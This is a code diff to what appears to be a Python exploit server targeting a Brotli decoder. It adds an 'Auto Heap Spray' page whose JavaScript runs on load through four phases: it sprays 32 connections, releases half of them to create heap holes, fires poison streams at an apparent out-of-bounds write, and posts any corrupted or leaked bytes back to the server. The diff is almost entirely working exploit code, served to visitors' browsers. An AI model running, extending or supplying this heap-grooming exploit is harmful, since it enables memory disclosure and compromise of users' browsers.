@@ -486,6 +486,7 @@ The OOB write reads from prefix data in ring buffer.</p>
 <p class="info">Opens parallel Brotli connections to spray 128KB ring buffers.
 Then releases half to create holes and fires poison stream into adjacent slot.</p>
 <a href="/groom/landing">GROOM: Interactive Heap Spray Page</a>
+<a href="/groom/auto">GROOM: Auto Heap Spray (runs all phases automatically)</a>
 <a href="/groom/status">GROOM: Check active groom sessions (JSON)</a>
 <a href="/probe/leaks">PROBE: View all leaked data (JSON)</a>
 </div>
@@ -695,6 +696,126 @@ async function readBack() {
     }
     log('\\n[*] Readback complete. Check server console for leaked data.', 'info');
 }
+</script>
+</body>
+</html>"""
+
+
+GROOM_AUTO = """<!DOCTYPE html>
+<html>
+<head><title>Auto Heap Spray</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
+body { font-family: monospace; background: #111; color: #0f0; padding: 1em;
+       font-size: 14px; white-space: pre-wrap; }
+.err { color: #f44; } .info { color: #4af; } .warn { color: #f80; }
+</style>
+</head>
+<body id="log">Auto Heap Spray starting...
+<script>
+const S = location.origin;
+const N = 32;
+let ctrls = [], resps = [];
+let sid = Date.now().toString(36);
+
+function log(m, c) {
+    let s = document.createElement('span');
+    s.className = c || '';
+    s.textContent = m + '\\n';
+    document.getElementById('log').appendChild(s);
+}
+
+async function run() {
+    // Phase 1: Spray
+    log('\\n=== PHASE 1: Spray ' + N + ' groom connections ===', 'info');
+    let fetches = [];
+    for (let i = 0; i < N; i++) {
+        let c = new AbortController();
+        ctrls.push(c);
+        let m = (0x40 + i) & 0xFF;
+        fetches.push(
+            fetch(S + '/groom/' + sid + '/' + i + '?marker=' + m, {
+                signal: c.signal, headers: {'Accept': 'text/html'}
+            }).then(r => { resps[i] = r; log('[+] Groom ' + i + ' OK (0x' + m.toString(16) + ')'); })
+              .catch(e => { resps[i] = null; log('[-] Groom ' + i + ': ' + e.message, 'err'); })
+        );
+    }
+    await Promise.allSettled(fetches);
+    let ok = resps.filter(r => r).length;
+    log('Spray done: ' + ok + '/' + N + ' (' + (ok*128) + 'KB)', 'info');
+
+    // Phase 2: Release even slots
+    log('\\n=== PHASE 2: Release even connections ===', 'info');
+    for (let i = 0; i < N; i += 2) {
+        if (ctrls[i]) { ctrls[i].abort(); log('[~] Released ' + i); }
+    }
+    await new Promise(r => setTimeout(r, 300));
+
+    // Phase 3: Fire poison streams
+    log('\\n=== PHASE 3: Fire poison streams ===', 'info');
+    let endpoints = ['/poison/leak', '/poison/info', '/poison/spray', '/stale-read'];
+    for (let ep of endpoints) {
+        try {
+            let r = await fetch(S + ep);
+            let t = await r.text();
+            let nonAscii = 0, hexPreview = '';
+            for (let j = 0; j < Math.min(80, t.length); j++) {
+                let c = t.charCodeAt(j);
+                if (c < 32 || c > 126) nonAscii++;
+                hexPreview += c.toString(16).padStart(2,'0') + ' ';
+            }
+            log('[+] ' + ep + ': ' + t.length + ' chars, ' + nonAscii + ' non-ASCII', t.length > 0 ? '' : 'warn');
+            log('    hex: ' + hexPreview.slice(0, 240), 'info');
+        } catch(e) {
+            log('[-] ' + ep + ': ' + e.message, 'err');
+        }
+    }
+
+    // Phase 4: Read back odd groom slots
+    log('\\n=== PHASE 4: Read back odd groom responses ===', 'info');
+    let leaks = 0;
+    for (let i = 1; i < N; i += 2) {
+        if (!resps[i]) continue;
+        try {
+            let t = await resps[i].text();
+            let marker = (0x40 + i) & 0xFF;
+            let corrupted = 0;
+            for (let j = 0; j < t.length; j++) {
+                if (t.charCodeAt(j) !== marker) corrupted++;
+            }
+            if (corrupted > 0) {
+                leaks++;
+                log('[!!!] Groom ' + i + ': ' + corrupted + '/' + t.length + ' corrupted bytes!', 'err');
+                let first = -1;
+                for (let j = 0; j < t.length; j++) {
+                    if (t.charCodeAt(j) !== marker) { first = j; break; }
+                }
+                if (first >= 0) {
+                    let hex = '';
+                    for (let j = first; j < Math.min(first+32, t.length); j++)
+                        hex += t.charCodeAt(j).toString(16).padStart(2,'0') + ' ';
+                    log('    offset=' + first + ' hex: ' + hex, 'info');
+                    fetch(S + '/probe/readback', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({session:sid, slot:i, offset:first,
+                            hex:hex.trim(), total_len:t.length, corrupted_count:corrupted})
+                    });
+                }
+            } else {
+                log('[=] Groom ' + i + ': clean (' + t.length + 'B)');
+            }
+        } catch(e) {
+            log('[-] Groom ' + i + ': ' + e.message, 'err');
+        }
+    }
+
+    log('\\n=== COMPLETE ===', 'info');
+    log('Leaking slots: ' + leaks + '/' + (N/2), leaks > 0 ? 'err' : '');
+    log('Session: ' + sid, 'info');
+}
+
+run();
 </script>
 </body>
 </html>"""
@@ -935,6 +1056,9 @@ def handle_client(ssl_sock, addr, stage1, stage2_crash):
         # --- Heap spray grooming endpoints ---
         elif path == "/groom/landing":
             _send_html(ssl_sock, GROOM_LANDING)
+
+        elif path == "/groom/auto":
+            _send_html(ssl_sock, GROOM_AUTO)
 
         elif path.startswith("/groom/") and "/" in path[7:]:
             # /groom/<session_id>/<slot>?marker=<byte>
